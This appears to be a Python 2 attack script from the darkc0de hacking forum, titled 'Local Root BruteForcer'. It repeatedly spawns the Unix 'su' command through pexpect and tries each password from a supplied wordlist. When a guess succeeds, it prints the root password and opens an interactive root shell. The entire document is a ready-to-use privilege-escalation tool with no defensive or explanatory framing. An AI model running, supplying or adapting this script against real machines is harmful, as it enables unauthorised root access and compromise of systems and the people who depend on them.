#!/usr/bin/python 
#Local Root BruteForcer 

#More Info: http://forum.darkc0de.com/index.php?action=vthread&forum=8&topic=1571
 
#http://www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
 
import sys 
try: 
	import pexpect 
except(ImportError): 
	print "\nYou need the pexpect module." 
	print "http://www.noah.org/wiki/Pexpect\n" 
	sys.exit(1) 
 
#Change this if needed. 
LOGIN_ERROR = 'su: incorrect password' 
 
def brute(word): 
	print "Trying:",word 
	child = pexpect.spawn ('su') 
	child.expect ('Password: ') 
	child.sendline (word) 
	i = child.expect (['.+\s#\s',LOGIN_ERROR]) 
	if i  == 0: 
		print "\n\t[!] Root Password:",word 
		child.sendline ('whoami') 
		print child.before 
		child.interact() 
	#if i == 1: 
		#print "Incorrect Password" 
 
if len(sys.argv) != 2: 
	print "\nUsage : ./rootbrute.py <wordlist>" 
	print "Eg: ./rootbrute.py words.txt\n" 
	sys.exit(1) 
 
try: 
	words = open(sys.argv[1], "r").readlines() 
except(IOError): 
  	print "\nError: Check your wordlist path\n" 
  	sys.exit(1) 
 
print "\n[+] Loaded:",len(words),"words" 
print "[+] BruteForcing...\n" 
for word in words: 
	brute(word.replace("\n",""))